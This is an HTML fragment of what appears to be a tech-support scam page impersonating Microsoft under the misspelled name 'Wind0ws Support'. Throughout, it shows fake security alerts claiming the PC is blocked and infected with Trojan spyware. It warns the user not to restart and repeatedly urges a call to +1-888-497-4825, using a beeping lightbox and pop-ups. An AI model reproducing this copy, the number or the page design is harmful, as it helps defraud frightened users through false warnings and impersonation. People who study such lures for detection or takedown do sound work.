    ...
    <audio id="websgt">
        ...
        <div class="scan_box2">
          <div class="scan_box_header">
           ...
           <span class="fl title2" id="txts1">
              <a href="#" id="cross">
                <p style="margin-right:50px;">+1-888-497-4825</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
                      </a>
        ...
        <div class="row">
          <div class="col-md-12">
            <div class="right-foot" style="text-align:center">
              ...
              <span style="font-weight:500;padding-left:13px;color:#fff; ">Wind0ws Support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">    +1-888-497-4825
                </span>
              </span>
            </div>
          </div>
      ...
      <div class="lightbox" id="mnboxs" onclick="beep1();" style="display: none; cursor:default;">
        ...
        <div id="disclaimer" style="color:#0F396D;">Call support for help<br>
           <span class="support" style="font-size:22px;">Wind0ws Support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">    +1-888-497-4825
            </span>
          </span>
        </div>
        <div id="bottom">
      ...
      <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
        ...
        <p>
         ...
         <p style="padding-bottom:0;color:#fff;font-size:16px">Wind0ws Please call support:<strong>
            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">   +1-888-497-4825
            </span>
          </strong>
        </p>
      ...
      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this system has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a Microsoft expert will guide you through the investigation over the phone. Running this application may put your PC at risk。<br>
          <strong>
         Wind0ws Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    +1-888-497-4825
            </span>
          </strong>
        </p>
      </div>
      <div id="chat" style="display: none;">
        ...
        <h4 style="font-weight:600;color:#0F396D;font-size:22px">    +1-888-497-4825
...
<br>Your system has been reported to be infected with Trojan-type spyware.<br>For assistance, contact Microsoft Support<br><strong style="font-size:24px;">+1-888-497-4825			 	</strong></p>
